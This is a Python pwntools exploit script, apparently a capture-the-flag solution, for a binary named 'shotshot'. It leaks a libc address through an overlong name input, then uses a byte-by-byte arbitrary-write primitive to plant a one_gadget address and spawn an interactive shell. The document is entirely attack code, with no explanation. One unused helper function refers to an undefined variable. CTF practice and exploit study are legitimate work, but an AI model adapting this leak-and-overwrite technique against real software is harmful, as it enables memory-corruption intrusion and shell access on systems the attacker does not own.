#author:0gur1
from pwn import *
context.log_level='debug'
timeout = 0
gadget=[0x45216,0x4526a,0xf02a4,0xf1147]

p = process('./shotshot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def welcome(name):
	p.sendlineafter("Your name :",name,timeout)

def create(name,n):
	p.sendlineafter("5. exit\n",'1',timeout)
	p.sendlineafter("Input the length of your weapon's name:\n",str(n),timeout)
	p.sendlineafter("Input the name:\n",name,timeout)

def show():
	p.sendlineafter("5. exit\n",'2',timeout)

def func1(ids,luckynum):
	p.sendlineafter("Input the id:\n",str(ids),timeout)
	p.sendlineafter("Give me your luckynum:\n",str(luckynum),timeout)
	
def shot(ids,luckynum,flag=0):
	p.sendlineafter("5. exit\n",'4',timeout)
	p.sendlineafter("3. C++\n",str(num),timeout)
	p.sendlineafter("Input the id:\n",str(ids),timeout)
	if flag:
		p.sendlineafter("Give me your luckynum:\n",str(luckynum),timeout)
def select_shot(idx):
	p.recvuntil('exit')
	p.sendline('4')	
	p.recvuntil('3. C++')
	p.sendline(str(idx))
def write_one(where,value):
	select_shot(1)
	p.recvuntil('id:')
	p.sendline(str(where))
	select_shot(0)
	select_shot(0)
	select_shot(0)
	p.recvuntil('luckynum:')
	p.sendline(str(value))

#leak libc address
welcome('a'*40)
p.recvuntil("a"*40)
setvbuf_addr = u64(p.recv(6).ljust(8,'\x00'))-154
log.info("setvbuf address:%#x",setvbuf_addr)
libc_addr = setvbuf_addr - libc.symbols['setvbuf']
log.info("libc address:%#x",libc_addr)

#0x5ee000 is offset of libc and mmap
maybe = ((libc_addr+0x5ee000)>>8)&0xff
if maybe <0x70:
	print 'bad luck :('

create("0gur1",6)
for i in range(0,6):
	value = ((libc_addr+gadget[0])>>8*i)&0xff
	where = 0x1000*i+0x1020+i
	write_one(where,value)

#write the 2nd last byte
where = 0x1000*6+0x1000+1

write_one(where,maybe)
p.interactive()
